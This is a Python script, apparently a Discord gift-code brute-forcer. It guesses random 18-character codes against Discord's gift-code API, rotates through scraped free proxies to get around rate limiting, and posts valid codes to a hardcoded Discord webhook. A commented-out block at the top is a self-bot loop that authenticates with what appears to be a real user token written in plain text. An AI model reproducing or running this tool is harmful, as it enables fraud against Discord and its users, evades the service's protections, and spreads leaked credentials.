# import requests,time

# url = "https://discord.com/api/v9/channels/698825022256709640/messages"
# times = 0;
# while True:
#     times+=1
#     requests.post(url, headers={"Authorization": "MTE0MjAyNzI5MDcwNDg3OTY5OQ.GFBnaD.4cUDtkDs5TtFUMDhyekDSwjPkS1aZTNgn6Moos"}, data={"content": "!work"})
#     print(times)
#     time.sleep(32)

import string
import random
import requests
import time
from bs4 import BeautifulSoup

# Constants
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1244958700515622942/j_7ZwvoppCg9RJ0Hgp9DfFtmEi5wd1jkroMHRPq_v3VO1PEjkwA-Dqsw87T6haO653te"

# Generate a random alphanumeric string of length 18

# Generate a random alphanumeric string of length 18
def generate_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=18))

# Send code to Discord webhook
def send_to_discord(code):
    data = {
        "content": f"Valid code found: {code}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print(f"Successfully sent to Discord: {code}")
    else:
        print(f"Failed to send to Discord: {code}, Status Code: {response.status_code}")

# Scrape proxies from a free proxy website
def fetch_proxies():
    url = 'https://www.sslproxies.org/'  # Example site
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Failed to fetch proxies, Status Code: {response.status_code}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.find('table', {'class': 'table table-striped table-bordered'})
    if table is None or table.tbody is None:
        print("Failed to find proxy list table in the HTML.")
        print(table)
        return []

    proxies = []
    for row in table.tbody.find_all('tr'):
        proxies.append({
            'ip': row.find_all('td')[0].text,
            'port': row.find_all('td')[1].text
        })
    
    return proxies

def get_proxy_list():
    proxies = fetch_proxies()
    return [f"http://{proxy['ip']}:{proxy['port']}" for proxy in proxies]

# Main function to check gift code and use proxies
def check_gift_code():
    
    proxy_list = get_proxy_list()
    if not proxy_list:
        print("No proxies available. Exiting.")
        return
    while True:
        time.sleep(2)
        code = generate_code()
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}"
        
        proxy = {"http": random.choice(proxy_list)}
        print("PROXY USED:", proxy)
        try:
            response = requests.get(url, proxies=proxy)
            if response.status_code == 200:
                send_to_discord(code)
            elif response.status_code == 429:
                print("Rate limited. Sleeping for a while.")
            else:
                print(f"Invalid code: {code}, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        
        # Sleep to avoid spamming requests too quickly
        time.sleep(1)

if __name__ == "__main__":
    check_gift_code()
